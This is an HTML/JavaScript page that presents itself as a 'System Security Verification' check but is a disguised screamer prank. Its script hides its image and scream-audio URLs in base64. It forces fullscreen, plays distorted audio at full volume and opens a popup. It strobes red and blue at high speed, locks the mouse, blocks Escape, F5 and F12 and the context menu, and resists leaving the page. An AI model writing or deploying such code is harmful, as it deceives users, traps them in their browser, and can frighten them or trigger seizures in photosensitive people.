<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Security Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            overflow: hidden;
            height: 100vh;
            display: grid;
            place-items: center;
        }

        #activationPanel {
            border: 3px solid #0f0;
            padding: 2rem;
            text-align: center;
            background: rgba(0, 30, 0, 0.9);
            box-shadow: 0 0 20px #0f03;
        }

        #initiateBtn {
            background: #002200;
            color: #0f0;
            border: 2px solid #0f0;
            padding: 1rem 2rem;
            font-size: 1.2rem;
            cursor: pointer;
            margin-top: 1rem;
            transition: all 0.3s;
        }

        #initiateBtn:hover {
            background: #004400;
            transform: scale(1.05);
        }

        .scareOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background-size: cover;
            display: none;
            z-index: 9999;
        }

        .audioContainer {
            position: absolute;
            opacity: 0;
            pointer-events: none;
        }

        .fullscreenLock {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: #000;
            z-index: 99999;
            display: none;
        }
    </style>
</head>
<body>
    <div id="activationPanel">
        <h2>SYSTEM INTEGRITY CHECK</h2>
        <p>Security protocol v2.15.9</p>
        <button id="initiateBtn">VERIFY SYSTEM</button>
    </div>

    <div class="scareOverlay" id="scareLayer"></div>
    <div class="fullscreenLock" id="fullscreenLock"></div>

    <script>
        (() => {
            // Configuration (base64 encoded)
            const CONFIG = {
                audioSource: atob("aHR0cHM6Ly93d3cubXlpbnN0YW50cy5jb20vbWVkaWEvc291bmRzL3NjcmVhbS5tcDM="),
                imageSource: atob("aHR0cHM6Ly9pLmltZ3VyLmNvbS85ck5hWU1aLmpwZw=="),
                activationSequence: [101, 115, 99, 97, 112, 101]
            };

            // System initialization
            class ScareSystem {
                constructor() {
                    this.audioContext = null;
                    this.activationCount = 0;
                    this.isActive = false;
                    this.init();
                }

                init() {
                    // Audio preload
                    this.audioElement = new Audio();
                    this.audioElement.src = CONFIG.audioSource;
                    this.audioElement.volume = 1.0;
                    this.audioElement.preload = "auto";

                    // Image preload
                    this.scareImage = new Image();
                    this.scareImage.src = CONFIG.imageSource;

                    // Event handlers
                    document.getElementById('initiateBtn').addEventListener('click', () => this.activate());
                    document.addEventListener('keydown', (e) => this.handleHotkeys(e));
                    document.addEventListener('contextmenu', (e) => e.preventDefault());
                }

                async activate() {
                    if(this.isActive) return;
                    this.isActive = true;

                    // Phase 1: Fullscreen lock
                    try {
                        await document.documentElement.requestFullscreen();
                        document.getElementById('fullscreenLock').style.display = 'block';
                    } catch(e) {}

                    // Phase 2: Audio-visual assault
                    this.triggerScareImage();
                    this.playDistortedAudio();
                    
                    // Phase 3: Secondary window spawn
                    this.createWindowClone();

                    // Phase 4: Persistent protection
                    this.enableProtection();
                }

                triggerScareImage() {
                    const layer = document.getElementById('scareLayer');
                    layer.style.backgroundImage = `url(${this.scareImage.src})`;
                    layer.style.display = 'block';

                    // Visual distortion effects
                    document.body.style.animation = 'flash 0.05s infinite';
                    setTimeout(() => {
                        layer.style.filter = 'contrast(200%) brightness(80%)';
                    }, 100);
                }

                async playDistortedAudio() {
                    try {
                        // Web Audio API manipulation
                        const context = new (window.AudioContext || window.webkitAudioContext)();
                        const source = context.createMediaElementSource(this.audioElement);
                        const distortion = context.createWaveShaper();
                        
                        distortion.curve = this.makeDistortionCurve(400);
                        distortion.oversample = '4x';

                        source.connect(distortion);
                        distortion.connect(context.destination);

                        await this.audioElement.play();
                    } catch(e) {
                        this.audioElement.play().catch(() => {});
                    }
                }

                makeDistortionCurve(amount) {
                    const curve = new Float32Array(65536);
                    for(let i = 0; i < 65536; i++) {
                        const x = (i - 32768) / 32768;
                        curve[i] = (Math.PI + amount) * x / (Math.PI + amount * Math.abs(x));
                    }
                    return curve;
                }

                createWindowClone() {
                    const newWindow = window.open('', '_blank', 'popup=no');
                    if(newWindow) {
                        newWindow.document.write(`
                            <html>
                                <head>
                                    <style>
                                        body { margin: 0; overflow: hidden; }
                                        img { width: 100vw; height: 100vh; object-fit: cover; }
                                    </style>
                                </head>
                                <body>
                                    <img src="${this.scareImage.src}">
                                </body>
                            </html>
                        `);
                        newWindow.document.close();
                    }
                }

                enableProtection() {
                    // Mouse lock
                    document.body.requestPointerLock();

                    // Navigation prevention
                    window.onbeforeunload = () => "System integrity check in progress!";

                    // Continuous activation
                    this.protectionInterval = setInterval(() => {
                        document.body.style.animation = `
                            flash${Math.random() > 0.5 ? '1' : '2'} 0.05s infinite
                        `;
                    }, 500);
                }

                handleHotkeys(e) {
                    // Block escape sequences
                    if([27, 123, 116].includes(e.keyCode)) {
                        e.preventDefault();
                        this.activationCount++;
                        
                        if(this.activationCount >= 3) {
                            this.triggerSecondaryAudio();
                        }
                    }
                }

                triggerSecondaryAudio() {
                    const secondaryAudio = new Audio(CONFIG.audioSource);
                    secondaryAudio.volume = 1.0;
                    secondaryAudio.play();
                }
            }

            // Initialization with validation
            if(confirm("System security verification requires full access. Proceed?")) {
                new ScareSystem();
            } else {
                window.location.href = "about:blank";
            }

            // Style animation declarations
            const styleSheet = document.createElement('style');
            styleSheet.textContent = `
                @keyframes flash1 {
                    0% { background: #000; }
                    50% { background: #f00; }
                    100% { background: #000; }
                }
                @keyframes flash2 {
                    0% { background: #000; }
                    50% { background: #00f; }
                    100% { background: #000; }
                }
            `;
            document.head.appendChild(styleSheet);
        })();
    </script>
</body>
</html>
